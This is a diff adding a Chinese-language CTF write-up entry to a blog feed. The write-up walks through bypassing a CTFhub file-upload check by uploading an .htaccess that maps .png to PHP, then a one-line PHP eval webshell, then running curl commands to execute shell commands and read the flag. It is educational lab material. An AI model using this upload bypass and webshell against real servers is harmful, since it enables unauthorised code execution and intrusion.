@@ -4,6 +4,35 @@
   
   
   <entry>
+    <title>文件上传(.htaccess)</title>
+    <link href="/Crow.github.io/2026/11/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-htaccess/"/>
+    <url>/Crow.github.io/2026/11/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-htaccess/</url>
+    
+    <content type="html"><![CDATA[<p>工具:curl</p><p>环境:Ctfhub靶场</p><p>内容:验证文件上传.htaccess漏洞,找flag</p><p>原理:</p><ul><li><strong>A:</strong> 什么是.htaccess–&gt;他是一个目录级配置文件,可以管理哪个后缀的文件当做什么类型来处理</li><li><strong>B:</strong> 那么问题就来了,如果网站允许.htaccess生效,那么攻击者就可以通过上传一个写好的.htaccess来告诉Apache服务器:我后面所有上传的.png都当做.php来执行,这样一来,我们只需要将shell.php的后缀改成.png,就可以成功地上传并执行我们的一句话木马</li><li><strong>C:</strong> 用处:如果对上传文件的限制设置在服务器,那么我们可以通过上传一个恶意的.htaccess,让服务器把.png当做.php来执行</li></ul><h2 id="1-打开靶场-拿到URL"><a href="#1-打开靶场-拿到URL" class="headerlink" title="1,打开靶场,拿到URL"></a>1,打开靶场,拿到URL</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://challenge-e41bc8c8668bcc99.sandbox.ctfhub.com:10800/<br></code></pre></td></tr></table></figure><h2 id="2-建一个cat-htaccess来实现将目录里的-png，都交给-PHP-解析的功能"><a href="#2-建一个cat-htaccess来实现将目录里的-png，都交给-PHP-解析的功能" class="headerlink" title="2,建一个cat .htaccess来实现将目录里的 .png，都交给 PHP 解析的功能"></a>2,建一个cat .htaccess来实现将目录里的 .png，都交给 PHP 解析的功能</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> &gt; .htaccess &lt;&lt;<span class="hljs-string">&#x27;EOF&#x27;</span><br>AddType application/x-httpd-php .png<br>EOF<br></code></pre></td></tr></table></figure><p>这里我没有看见文件,了解之后知道了因为.htaccess以.开头ls默认不显示,所以被隐藏了.</p><h2 id="3-因为-htaccess被隐藏了-所以直接在浏览器中上传非常之不方便-这里用curl来上传"><a href="#3-因为-htaccess被隐藏了-所以直接在浏览器中上传非常之不方便-这里用curl来上传" class="headerlink" title="3,因为.htaccess被隐藏了,所以直接在浏览器中上传非常之不方便,这里用curl来上传."></a>3,因为.htaccess被隐藏了,所以直接在浏览器中上传非常之不方便,这里用curl来上传.</h2><p>执行命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -F <span class="hljs-string">&quot;file=@.htaccess&quot;</span> -F <span class="hljs-string">&quot;submit=Submit&quot;</span> http://challenge-e41bc8c8668bcc99.sandbox.ctfhub.com:10800/<br></code></pre></td></tr></table></figure><p>成功的返回了路径upload&#x2F;.htaccess</p><img width="2470" height="852" alt="d75366450a41445de70dc127ab04eccc" src="https://github.com/user-attachments/assets/031664f0-8d7a-4634-a300-2287c7a94091" /><h2 id="4-制作木马并上传"><a href="#4-制作木马并上传" class="headerlink" title="4,制作木马并上传"></a>4,制作木马并上传</h2><p>执行命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~<br><span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;%s&#x27;</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;value&quot;]); ?&gt;&#x27;</span> &gt; shell.png<br><span class="hljs-built_in">cat</span> shell.png<br>curl -F <span class="hljs-string">&quot;file=@shell.png&quot;</span> -F <span class="hljs-string">&quot;submit=Submit&quot;</span> http://challenge-e41bc8c8668bcc99.sandbox.ctfhub.com:10800/<br></code></pre></td></tr></table></figure><p>返回了路径upload&#x2F;shell.png</p><h2 id="5-验证-htaccess是否生效"><a href="#5-验证-htaccess是否生效" class="headerlink" title="5,验证.htaccess是否生效"></a>5,验证.htaccess是否生效</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -d <span class="hljs-string">&#x27;value=system(&quot;id&quot;);&#x27;</span> http://challenge-e41bc8c8668bcc99.sandbox.ctfhub.com:10800/upload/shell.png<br></code></pre></td></tr></table></figure><p>几种情况:</p><ul><li><strong>a,</strong> <code>404</code>–&gt;URL错了</li><li><strong>b,</strong> <code>&lt;?......?&gt;</code>原文–&gt;没生效</li><li><strong>c,</strong> 显示uid&#x3D;33(www-data)–&gt;成功生效</li></ul><img width="2394" height="906" alt="3aa6b363b64c9b8005c4d9ae81dc4137" src="https://github.com/user-attachments/assets/eae3a393-dfe4-4f5c-8856-45d4726b065d" /><h2 id="6-成功生效-去翻目录"><a href="#6-成功生效-去翻目录" class="headerlink" title="6,成功生效,去翻目录"></a>6,成功生效,去翻目录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -d <span class="hljs-string">&#x27;value=system(&quot;pwd; echo ---; ls -la /&quot;);&#x27;</span> http://challenge-e41bc8c8668bcc99.sandbox.ctfhub.com:10800/upload/shell.png<br></code></pre></td></tr></table></figure><p>列出了根目录</p><img width="1372" height="94" alt="c4607b5e9248a0a0d77d182916465e13" src="https://github.com/user-attachments/assets/edf5bb2b-63cb-4768-85f0-a86fdfb847d9" /><p>去几个关键目录里找找</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -d <span class="hljs-string">&#x27;value=system(&quot;ls -la /var/www/html; echo ---; ls -la /home; echo ---; ls -la /tmp&quot;);&#x27;</span> http://challenge-e41bc8c8668bcc99.sandbox.ctfhub.com:10800/upload/shell.png<br></code></pre></td></tr></table></figure><p>找到flag所在的文件了(flag_315471076.php)</p><img width="2107" height="412" alt="3843678f5aaa1a1c3e6d303a6d5eaea3" src="https://github.com/user-attachments/assets/07d4b432-f1ce-45e8-9748-0832cabc3eb4" /><h2 id="7-cat-the-flag"><a href="#7-cat-the-flag" class="headerlink" title="7,cat the flag"></a>7,cat the flag</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -d <span class="hljs-string">&#x27;value=system(&quot;cat /var/www/html/flag_315471076.php&quot;);&#x27;</span> http://challenge-e41bc8c8668bcc99.sandbox.ctfhub.com:10800/upload/shell.png<br></code></pre></td></tr></table></figure><hr><p>⚠️ 声明：本文涉及的攻击技术仅供网络安全学习与授权测试（如CTF靶场）使用。严禁用于任何未授权的真实网络环境，否则将触犯法律！</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>文件上传</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CTF</tag>
+      
+      <tag>文件上传</tag>
+      
+      <tag>Curl</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>信息读取小专栏</title>
     <link href="/Crow.github.io/2026/11/09/%E4%BF%A1%E6%81%AF%E8%AF%BB%E5%8F%96%E5%B0%8F%E4%B8%93%E6%A0%8F/"/>
     <url>/Crow.github.io/2026/11/09/%E4%BF%A1%E6%81%AF%E8%AF%BB%E5%8F%96%E5%B0%8F%E4%B8%93%E6%A0%8F/</url>
